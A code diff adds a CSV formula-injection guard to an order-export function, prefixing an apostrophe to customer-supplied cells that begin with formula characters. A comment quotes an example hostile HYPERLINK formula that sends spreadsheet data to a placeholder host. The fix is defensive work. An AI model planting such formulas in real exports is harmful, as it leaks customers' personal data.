@@ -76,9 +76,24 @@ function fmtDate(iso: string): string {
   });
 }
 
+/* Every exported value is customer-supplied — names, addresses, gift notes.
+   Excel and LibreOffice treat a cell starting with = + - @ as a formula, so
+   `=HYPERLINK("http://x?d="&A1)` typed into a shipping name would execute in
+   the seller's spreadsheet with the whole customer list open. Prefixing an
+   apostrophe forces the cell to text; the apostrophe itself is not displayed.
+
+   The check skips leading whitespace, tab, CR and LF first: those are ignored
+   when the formula parser looks for the first meaningful character, so
+   "\t=cmd" is just as dangerous as "=cmd". */
+function neutralize(s: string): string {
+  // A plain number is inert, and quoting it would break the money columns.
+  if (/^-?\d+(\.\d+)?$/.test(s)) return s;
+  return /^[\s\t\r\n]*[=+\-@]/.test(s) ? `'${s}` : s;
+}
+
 function csvCell(v: string | number | null | undefined): string {
-  const s = String(v ?? "");
-  return /[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
+  const s = neutralize(String(v ?? ""));
+  return /[",\r\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
 }
 
 /** BOM so Excel reads the diacritics in Sanskrit names correctly. */
